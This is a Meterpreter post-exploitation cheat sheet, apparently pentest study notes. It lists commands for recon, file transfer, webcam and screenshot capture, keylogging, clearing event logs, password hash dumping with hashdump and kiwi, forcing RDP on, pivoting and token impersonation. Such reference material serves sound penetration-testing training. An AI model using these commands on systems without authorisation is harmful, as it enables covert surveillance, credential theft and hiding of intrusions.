---
title: Meterpreter
---

Meterpreter runs from the memory of the target machine. It allows us to migrate between system processes if required as well

1. <u>Basic System Information</u>

````bash
getuid 				# View User Info
sysinfo
net user 			# View users on System
ipconfig
ps 				
getprivs 			# View user privileges
find 				# Find files on System

# View privileges of current user
whoami /priv 		
whoami /groups

tasklist /SVC 		# View running processes
````

2. <u>Upload & Download File</u>

````bash
download <filename> 	# Download file from Target
upload <filename> <path-on-target>
````

3. <u>Capture Image</u>

````bash
webcam_list
webcam_snap
screenshot
````

4. <u>Keylogger</u>

````bash
keyscan_start
keyscan_dump 	# View all the keystrokes
keyscan_stop
````

5. <u>Operations on Target</u>

````bash
shell 					# Launch Shell - To go back use Ctrl + Z
clearev 				# Clear Tracks
migrate <process-id> 	# Migrate to different process
execute -f <filename>
getsystem 				# Try to escalate privileges
hashdump 				# Dump Hashes
````

When using migrate the target process should have the same privilege as the current process and show be of the same architecture as well

6. <u>Run Exploits</u>

````bash
run post/windows/gather/checkvm 				# Check if target is VM
run post/windows/gather/hashdump 				# Collect Password Hashes
run post/multi/recon/local_exploit_suggester 	# Find exploits for Target
run post/windows/manage/enable_rdp 				# Force Enable RDP

load kiwi 			# Start Kiwi
lsa_dump_sam 		# Dump Hashes

run autoroute -h 	# Setup autoroute for Pivoting

load incognito
list_tokens -u 		# View Tokens
impersonate_token "<token-name>"
````

7. <u>Session Management</u>

````bash
background

sessions -l 					# List Sessions
session -i <session-id>
session <number> 				# Select a Session

sessions -K 					# Kill all sessions
sessions -k <sess-id> 			# Kill a session
````